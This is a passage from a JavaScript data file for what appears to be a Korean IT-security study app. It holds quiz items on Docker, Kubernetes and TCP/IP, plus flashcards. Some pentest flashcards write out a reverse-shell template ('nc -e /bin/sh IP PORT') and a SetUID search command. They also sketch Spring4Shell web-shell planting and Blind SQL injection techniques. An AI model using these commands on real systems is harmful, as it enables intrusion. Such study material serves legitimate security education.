            {q: 'CrashLoopBackOff 의미는?', options: ['이미지 에러', '컨테이너 반복 크래시', '네트워크 에러', '권한 에러'], correct: 1, exp: 'CrashLoopBackOff는 컨테이너가 계속 크래시하는 상태입니다.'},
            {q: 'ImagePullBackOff 의미는?', options: ['컨테이너 크래시', '이미지 다운로드 실패', '네트워크 에러', '권한 에러'], correct: 1, exp: 'ImagePullBackOff는 이미지 다운로드에 실패했습니다.'},
            {q: 'ErrImagePull 원인은?', options: ['컨테이너 에러', '이미지 이름/레지스트리 에러', '네트워크 끊김', 'CPU 부족'], correct: 1, exp: 'ErrImagePull은 잘못된 이미지 이름이나 레지스트리 주소 때문입니다.'},
            {q: 'ContainerCreating 의미는?', options: ['컨테이너 실행', '볼륨 마운트/네트워크 설정 중', '컨테이너 종료', '컨테이너 삭제'], correct: 1, exp: 'ContainerCreating은 볼륨과 네트워크 설정이 진행 중입니다.'},
            {q: 'Terminating 상태 의미는?', options: ['시작 중', '실행 중', 'Pod 삭제 진행 중', '에러'], correct: 2, exp: 'Terminating은 Pod 삭제가 진행 중입니다.'},
            {q: 'Pod Condition "Ready"의 의미는?', options: ['생성 완료', '요청 실행 가능', '종료 준비', '삭제 가능'], correct: 1, exp: 'Ready는 Pod가 요청을 처리할 수 있는 상태입니다.'},
            {q: 'UnSchedulable 원인은?', options: ['이미지 에러', '리소스 부족', '네트워크 에러', '권한 에러'], correct: 1, exp: 'UnSchedulable은 리소스 부족으로 스케줄링할 수 없습니다.'}
        ]
    },

    'network-docker-basics': {
        title: 'Docker 기초',
        questions: [
            {q: 'Docker 컨테이너와 VM의 차이는?', options: ['VM이 가벼움', '컨테이너가 호스트 커널 공유', '차이 없음', '컨테이너가 느림'], correct: 1, exp: 'Docker는 호스트 OS 커널을 공유하여 가볍습니다.'},
            {q: 'Docker 이미지 다운로드 명령은?', options: ['docker download', 'docker pull', 'docker get', 'docker fetch'], correct: 1, exp: 'docker pull로 이미지를 다운로드합니다.'},
            {q: '실행 중인 컨테이너 보기는?', options: ['docker list', 'docker ps', 'docker show', 'docker containers'], correct: 1, exp: 'docker ps로 실행 중인 컨테이너를 봅니다.'},
            {q: '모든 컨테이너 보기는?', options: ['docker ps', 'docker ps -a', 'docker ps -all', 'docker list -a'], correct: 1, exp: 'docker ps -a로 모든 컨테이너를 봅니다.'},
            {q: 'Docker 이미지 빌드 명령은?', options: ['docker create', 'docker build', 'docker make', 'docker compile'], correct: 1, exp: 'docker build로 Dockerfile에서 이미지를 빌드합니다.'},
            {q: '백그라운드 컨테이너 실행 옵션은?', options: ['-b', '-d', '-bg', '--background'], correct: 1, exp: '-d (detached) 옵션으로 백그라운드 실행합니다.'},
            {q: 'Dockerfile 베이스 이미지 지정 명령은?', options: ['BASE', 'FROM', 'IMAGE', 'USE'], correct: 1, exp: 'FROM으로 베이스 이미지를 지정합니다.'},
            {q: '컨테이너 내부 명령 실행은?', options: ['docker run', 'docker exec', 'docker cmd', 'docker command'], correct: 1, exp: 'docker exec로 실행 중인 컨테이너에서 명령을 실행합니다.'},
            {q: 'Docker 기본 네트워크는?', options: ['host', 'bridge', 'none', 'overlay'], correct: 1, exp: 'bridge 네트워크가 기본입니다.'},
            {q: 'Docker 볼륨의 목적은?', options: ['네트워크', '데이터 영속성', '압축', 'CPU 할당'], correct: 1, exp: '볼륨은 컨테이너 삭제 후에도 데이터를 유지합니다.'},
            {q: 'Docker Hub의 역할은?', options: ['컨테이너 실행', '이미지 레지스트리', '로그 수집', '모니터링'], correct: 1, exp: 'Docker Hub는 이미지를 저장하고 공유하는 레지스트리입니다.'}
        ]
    },

    'network-docker-commands': {
        title: 'Docker 명령어',
        questions: [
            {q: 'Docker Hub 로그인 명령은?', options: ['docker signin', 'docker login', 'docker auth', 'docker connect'], correct: 1, exp: 'docker login으로 레지스트리에 로그인합니다.'},
            {q: 'Docker Hub 이미지 검색은?', options: ['docker find', 'docker search', 'docker lookup', 'docker query'], correct: 1, exp: 'docker search로 이미지를 검색합니다.'},
            {q: 'docker run에서 --name의 역할은?', options: ['이미지 이름', '컨테이너 이름 지정', '네트워크 이름', '볼륨 이름'], correct: 1, exp: '--name으로 컨테이너 이름을 지정합니다.'},
            {q: 'docker run -p의 역할은?', options: ['프로세스 지정', '포트 포워딩', '패스워드 설정', '권한 부여'], correct: 1, exp: '-p는 호스트 포트를 컨테이너 포트에 매핑합니다.'},
            {q: 'docker run -v의 역할은?', options: ['버전 지정', '볼륨 마운트', 'verbose 모드', '가상화 활성'], correct: 1, exp: '-v는 호스트 디렉토리를 컨테이너에 마운트합니다.'},
            {q: 'docker run -e의 역할은?', options: ['에러 무시', '환경변수 설정', '실행 모드', '암호화 활성'], correct: 1, exp: '-e는 환경변수를 설정합니다.'},
            {q: 'docker run -i의 역할은?', options: ['이미지 지정', 'STDIN 열기', '인터렉티브', '설치 모드'], correct: 1, exp: '-i는 STDIN을 열어 입력을 받습니다.'},
            {q: 'docker run -t의 역할은?', options: ['시간 제한', 'pseudo-TTY 할당', '테스트 모드', '템플릿 사용'], correct: 1, exp: '-t는 가상 터미널을 할당합니다.'},
            {q: '중지된 컨테이너 시작은?', options: ['docker run', 'docker start', 'docker resume', 'docker restart'], correct: 1, exp: 'docker start로 중지된 컨테이너를 시작합니다.'},
            {q: '실행 중 컨테이너 중지는?', options: ['docker pause', 'docker stop', 'docker kill', 'docker halt'], correct: 1, exp: 'docker stop으로 컨테이너를 정상 종료합니다.'},
            {q: '컨테이너 강제 삭제는?', options: ['docker rm', 'docker rm -f', 'docker delete', 'docker kill'], correct: 1, exp: 'docker rm -f로 실행 중인 컨테이너를 강제 삭제합니다.'},
            {q: '모든 중지 컨테이너 삭제는?', options: ['docker rm --all', 'docker container prune', 'docker clean', 'docker clear'], correct: 1, exp: 'docker container prune으로 모든 중지 컨테이너를 삭제합니다.'},
            {q: '컨테이너 일시 정지는?', options: ['docker stop', 'docker pause', 'docker suspend', 'docker hold'], correct: 1, exp: 'docker pause로 모든 프로세스를 일시 정지합니다.'},
            {q: '컨테이너 이름 변경은?', options: ['docker mv', 'docker rename', 'docker name', 'docker change'], correct: 1, exp: 'docker rename으로 컨테이너 이름을 변경합니다.'},
            {q: '컨테이너 내부 프로세스 보기는?', options: ['docker ps', 'docker top', 'docker proc', 'docker process'], correct: 1, exp: 'docker top으로 컨테이너 내부 프로세스를 봅니다.'}
        ]
    },

    'network-docker-architecture': {
        title: 'Docker 아키텍처',
        questions: [
            {q: 'docker-ce의 역할은?', options: ['CLI', 'Docker 데몬', 'Container runtime', '빌드 도구'], correct: 1, exp: 'docker-ce는 Docker 데몬(dockerd)으로 컨테이너 관리의 핵심입니다.'},
            {q: 'docker-ce-cli의 역할은?', options: ['데몬', 'CLI 도구', 'Runtime', '네트워크'], correct: 1, exp: 'docker-ce-cli는 docker 명령을 제공하는 CLI입니다.'},
            {q: 'containerd.io의 역할은?', options: ['CLI', '데몬', '컨테이너 런타임', 'GUI'], correct: 2, exp: 'containerd는 실제 컨테이너 실행을 담당하는 런타임입니다.'},
            {q: 'Docker 컨테이너 라이프사이클 순서는?', options: ['create-start-stop-rm', 'pull-create-start-stop-rm', 'start-run-stop', 'build-run-kill'], correct: 1, exp: 'pull(이미지 다운) → create → start → stop → rm 순서입니다.'},
            {q: 'Windows Docker에 WSL2가 필요한 이유는?', options: ['GUI', 'Linux 커널 제공', '보안', '속도'], correct: 1, exp: 'WSL2는 Windows에서 Linux 커널을 제공하여 Docker 실행을 가능하게 합니다.'},
            {q: 'Docker Desktop의 역할은?', options: ['CLI만', 'GUI 관리 도구', '서버', '빌드 도구'], correct: 1, exp: 'Docker Desktop은 GUI로 컨테이너를 관리하는 도구입니다.'},
            {q: 'Hyper-V가 필요한 이유는?', options: ['보안', '가상화 기능', '네트워크', '스토리지'], correct: 1, exp: 'Hyper-V는 Windows의 가상화 기능을 제공합니다.'},
            {q: 'runc의 역할은?', options: ['이미지 빌드', '컨테이너 실행', 'CLI 제공', '네트워크 설정'], correct: 1, exp: 'runc는 OCI 표준 컨테이너 런타임으로 실제 실행을 담당합니다.'},
            {q: 'docker-buildx-plugin의 용도는?', options: ['실행', '멀티 플랫폼 빌드', '네트워크', '로깅'], correct: 1, exp: 'buildx는 멀티 플랫폼 이미지를 빌드하는 플러그인입니다.'},
            {q: 'docker-compose-plugin의 용도는?', options: ['단일 컨테이너', '다중 컨테이너 애플리케이션', '이미지 빌드', '네트워크'], correct: 1, exp: 'compose는 여러 컨테이너를 한 번에 관리합니다.'}
        ]
    },

    'network-tcp-ip': {
        title: 'TCP/IP 프로토콜',
        questions: [
            {q: 'OSI 7계층 중 Transport 계층은?', options: ['2계층', '3계층', '4계층', '5계층'], correct: 2, exp: 'Transport Layer는 4계층입니다.'},
            {q: 'OSI Application 계층은?', options: ['5계층', '6계층', '7계층', '8계층'], correct: 2, exp: 'Application Layer는 최상위 7계층입니다.'},
            {q: 'Network 계층 프로토콜은?', options: ['TCP', 'IP', 'HTTP', 'Ethernet'], correct: 1, exp: 'IP가 3계층 Network 계층 프로토콜입니다.'},
            {q: 'TCP 동작 계층은?', options: ['2계층', '3계층', '4계층', '7계층'], correct: 2, exp: 'TCP는 4계층 Transport 계층입니다.'},
            {q: 'Data Link 계층 주소는?', options: ['IP 주소', 'MAC 주소', '포트 번호', '도메인'], correct: 1, exp: '2계층은 MAC 주소를 사용합니다.'},
            {q: 'Physical 계층 주요 기능은?', options: ['라우팅', '전기 신호 전송', '암호화', '압축'], correct: 1, exp: '1계층은 물리적 신호 전송을 담당합니다.'},
            {q: 'HTTP 동작 계층은?', options: ['4계층', '5계층', '6계층', '7계층'], correct: 3, exp: 'HTTP는 7계층 Application 프로토콜입니다.'},
            {q: 'TCP와 UDP의 공통점은?', options: ['모두 3계층', '모두 4계층', '모두 연결지향', '모두 비연결지향'], correct: 1, exp: 'TCP와 UDP는 모두 4계층입니다.'},
            {q: 'TCP 특징이 아닌 것은?', options: ['연결지향', '신뢰성', '순서 보장', '브로드캐스트'], correct: 3, exp: 'TCP는 브로드캐스트를 지원하지 않습니다.'},
            {q: 'UDP의 장점은?', options: ['높은 신뢰성', '순서 보장', '빠른 전송', '에러 복구'], correct: 2, exp: 'UDP는 연결 설정 없이 빠르게 전송합니다.'},
            {q: '3-way handshake 프로토콜은?', options: ['UDP', 'TCP', 'ICMP', 'ARP'], correct: 1, exp: 'TCP는 연결 수립 시 3-way handshake를 사용합니다.'},
            {q: 'TCP 헤더의 플래그가 아닌 것은?', options: ['SYN', 'ACK', 'FIN', 'GET'], correct: 3, exp: 'GET은 HTTP 메서드이지 TCP 플래그가 아닙니다.'},
            {q: 'IP 헤더의 TTL 의미는?', options: ['전송 시간', 'Time To Live', '트래픽 타입', '총 길이'], correct: 1, exp: 'TTL은 패킷이 폐기되기 전 통과할 수 있는 라우터 수입니다.'},
            {q: 'ARP의 역할은?', options: ['DNS', 'IP → MAC 매핑', '라우팅', '암호화'], correct: 1, exp: 'ARP는 IP 주소를 MAC 주소로 변환합니다.'},
            {q: 'ICMP의 용도는?', options: ['파일 전송', 'ping, 에러 메시지', '암호화', '인증'], correct: 1, exp: 'ICMP는 ping과 에러 메시지에 사용됩니다.'},
            {q: 'Ethernet 프레임 최소 크기는?', options: ['32 bytes', '64 bytes', '128 bytes', '256 bytes'], correct: 1, exp: 'Ethernet 프레임은 최소 64 bytes입니다.'},
            {q: 'Ethernet 프레임 최대 크기는?', options: ['1024 bytes', '1518 bytes', '2048 bytes', '4096 bytes'], correct: 1, exp: 'Ethernet 프레임은 최대 1518 bytes입니다.'}
        ]
    }
};

// 플래시카드 데이터
const flashcardDatabase = {
    vulnerability: [
        { front: 'CVE-2022-22965', back: 'Spring4Shell<br><br>Spring Framework Data Binding 취약점<br>JDK 9+, Tomcat, WAR 환경에서 RCE' },
        { front: 'CVSS 9.8', back: 'Critical 등급<br><br>원격 인증 없이 완전한 시스템 제어<br>Spring4Shell, TeamCity CVE' },
        { front: 'Data Binding', back: 'HTTP 파라미터를 Java 객체에 자동 매핑<br><br>Spring4Shell에서 악용됨' },
        { front: 'AccessLogValve', back: 'Tomcat 로그 기록 컴포넌트<br><br>pattern을 JSP로, directory를 웹루트로 변경하여 웹셸 생성' },
        { front: 'class.module.classLoader', back: 'Spring4Shell 공격 파라미터 경로<br><br>ClassLoader 접근하여 설정 조작' },
        { front: 'CVE-2024-27198', back: 'TeamCity 인증 우회<br><br>경로 정규화 불일치로 관리 기능 접근<br>CI/CD 침해로 공급망 공격' },
        { front: 'KEV', back: 'Known Exploited Vulnerabilities<br><br>CISA 관리 실제 악용 중인 취약점<br>최우선 패치 대상' },
        { front: 'Supply Chain Attack', back: '공급망 공격<br><br>CI/CD 서버 침해로 빌드 산출물에 악성 코드 삽입' },
        { front: 'Blind SQL Injection', back: '쿼리 결과 미표시 SQL Injection<br><br>참/거짓 또는 시간 지연으로 데이터 추출' },
        { front: 'substr()', back: 'SQL 문자열 일부 추출<br><br>substr(database(), 1, 1)로 한 글자씩 추출' },
        { front: 'ord() / ascii()', back: '문자 → ASCII 값 변환<br><br>Blind SQL Injection 비교에 사용' },
        { front: 'information_schema', back: 'MySQL 시스템 DB<br><br>tables, columns로 모든 DB 구조 조회' },
        { front: 'sleep()', back: 'MySQL 지연 함수<br><br>Time-based Injection에서 조건 참일 때 지연' },
        { front: '/etc/passwd', back: 'Linux 사용자 계정 정보<br><br>7필드: 사용자:x:UID:GID:설명:홈:쉘<br>권한 644' },
        { front: '/etc/shadow', back: '암호화된 패스워드<br><br>$6$=SHA-512, !!=잠금<br>권한 640/600' },
        { front: 'UID 0', back: 'root 사용자<br><br>UID 0 가진 모든 계정은 root 권한' },
        { front: 'PermitRootLogin no', back: 'SSH root 직접 로그인 차단<br><br>/etc/ssh/sshd_config 설정' },
        { front: 'PasswordAuthentication no', back: 'SSH 패스워드 인증 비활성<br><br>키 기반 인증만 허용' },
        { front: 'SetUID 비트', back: '파일 실행 시 소유자 권한<br><br>4000 (chmod u+s)<br>권한 상승 악용 가능' },
        { front: 'Sticky Bit', back: '/tmp 등에서 자신 파일만 삭제<br><br>1000 (chmod +t)<br>t=실행O, T=실행X' },
        { front: '755 권한', back: 'rwxr-xr-x<br><br>소유자: rwx<br>그룹: r-x<br>기타: r-x' },
        { front: 'PAM', back: 'Pluggable Authentication Modules<br><br>Linux 인증 플러그인<br>/etc/pam.d/ 설정' },
        { front: 'Lambda 함수', back: 'Python 익명 함수<br><br>lambda x: x*2<br>단일 표현식만 가능' },
        { front: 'List Comprehension', back: '[x*2 for x in range(10)]<br><br>for 루프를 한 줄로 간결하게' },
        { front: '*args, **kwargs', back: '가변 길이 인자<br><br>*args: 위치 인자<br>**kwargs: 키워드 인자' }
    ],
    pentest: [
        { front: 'RCE', back: 'Remote Code Execution<br><br>원격에서 임의 코드 실행<br>가장 치명적인 취약점' },
        { front: 'Payload', back: '악의적 동작 수행 코드<br><br>웹셸, 명령어, 악성 스크립트' },
        { front: 'Web Shell', back: '웹 서버의 악성 스크립트<br><br>브라우저로 서버 명령 실행<br>JSP, PHP, ASPX' },
        { front: 'Reverse Shell', back: '서버가 공격자에게 역연결<br><br>방화벽 아웃바운드 우회<br>nc -e /bin/sh IP PORT' },
        { front: 'Privilege Escalation', back: '권한 상승<br><br>낮은 권한 → root/SYSTEM<br>SetUID, sudo, kernel exploit' },
        { front: 'SetUID Exploit', back: 'SetUID 비트 악용<br><br>find / -perm -4000<br>소유자 권한으로 실행' },
        { front: 'sudo -l', back: 'sudo 실행 가능 명령 확인<br><br>권한 상승 경로 탐색' },
        { front: 'Lateral Movement', back: '수평 이동<br><br>침투 시스템 → 네트워크 내 다른 시스템<br>자격증명 재사용' },
        { front: 'Persistence', back: '지속성 확보<br><br>재부팅 후에도 접근 유지<br>cron, 서비스, 백도어' },
        { front: 'WAF Bypass', back: 'Web Application Firewall 우회<br><br>인코딩, 대소문자, 주석 삽입' },
        { front: 'Command Injection', back: 'OS 명령어 삽입<br><br>; | & 로 명령어 체이닝<br>입력값 검증 부재' },
        { front: 'socket.socket()', back: 'Python 소켓 생성<br><br>socket.socket(AF_INET, SOCK_STREAM)<br>TCP 소켓' },
        { front: 'connect_ex()', back: '소켓 연결 시도<br><br>반환값 0 = 포트 열림<br>포트 스캔에 사용' },
        { front: 'XOR 암호화', back: '가역 대칭 암호<br><br>data ^ key ^ key = data<br>같은 키로 암/복호화' },
        { front: 'Base64 인코딩', back: '바이너리 → 텍스트 변환<br><br>암호화 아님, 인코딩<br>키 저장에 사용' }
    ],
    network: [
        { front: 'Kubernetes', back: '그리스어 "키잡이(helmsman)"<br><br>Google 2014 개발<br>컨테이너 오케스트레이션' },
        { front: 'Pod', back: 'K8s 최소 배포 단위<br><br>1개 이상 컨테이너<br>같은 IP 공유' },
        { front: 'kubectl', back: 'K8s 클러스터 제어 CLI<br><br>get, describe, create, delete' },
        { front: 'etcd', back: '키-값 저장소<br><br>클러스터 모든 데이터 저장<br>kube-apiserver만 접근' },
        { front: 'kube-apiserver', back: 'K8s API 노출<br><br>모든 요청 검증<br>etcd 통신' },
        { front: 'kube-scheduler', back: 'Pod 배치 노드 선택<br><br>리소스 고려하여 스케줄링' },
        { front: 'kubelet', back: 'Worker Node 에이전트<br><br>Pod 컨테이너 관리<br>헬스 체크 (cAdvisor)' },
        { front: 'kube-proxy', back: '가상 네트워킹 관리<br><br>연결 포워딩<br>Service 구현' },
        { front: 'CoreDNS', back: '클러스터 내부 DNS<br><br>Pod 이름 해석' },
        { front: 'Namespace', back: '리소스 논리적 격리<br><br>default, kube-system<br>멀티 테넌시' },
        { front: 'CrashLoopBackOff', back: '컨테이너 반복 크래시<br><br>설정 오류, 의존성 문제' },
        { front: 'ImagePullBackOff', back: '이미지 다운로드 실패<br><br>레지스트리 접근 불가' },
        { front: 'docker pull', back: '이미지 다운로드<br><br>Docker Hub에서 가져오기' },
        { front: 'docker ps', back: '실행 중 컨테이너<br><br>-a: 모든 컨테이너<br>-q: ID만' },
        { front: 'docker exec', back: '실행 중 컨테이너에서 명령<br><br>docker exec -it <name> bash' },
        { front: 'Dockerfile', back: '이미지 빌드 스크립트<br><br>FROM, RUN, COPY, CMD' },
        { front: 'docker -d', back: 'detached 모드<br><br>백그라운드 실행' },
        { front: 'docker -p', back: '포트 포워딩<br><br>-p 8080:80<br>호스트:컨테이너' },
        { front: 'containerd', back: '컨테이너 런타임<br><br>실제 컨테이너 실행<br>runc 사용' },
        { front: 'WSL2', back: 'Windows Subsystem for Linux v2<br><br>Windows에서 Linux 커널 제공' },
        { front: 'OSI 7계층', back: '7-Application, 6-Presentation, 5-Session<br>4-Transport, 3-Network, 2-DataLink, 1-Physical' },
        { front: 'TCP 3-way Handshake', back: '1) SYN →<br>2) ← SYN+ACK<br>3) ACK →<br><br>연결 수립' },
        { front: 'TCP vs UDP', back: 'TCP: 연결지향, 신뢰성, 순서보장<br>UDP: 비연결, 빠름, 순서X' },
        { front: 'TTL', back: 'Time To Live<br><br>패킷이 통과할 수 있는 라우터 수' },
        { front: 'ARP', back: 'Address Resolution Protocol<br><br>IP 주소 → MAC 주소 변환' },
        { front: 'ICMP', back: 'Internet Control Message Protocol<br><br>ping, 에러 메시지' }
    ]
};

// 내보내기
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { quizDatabase, flashcardDatabase };
}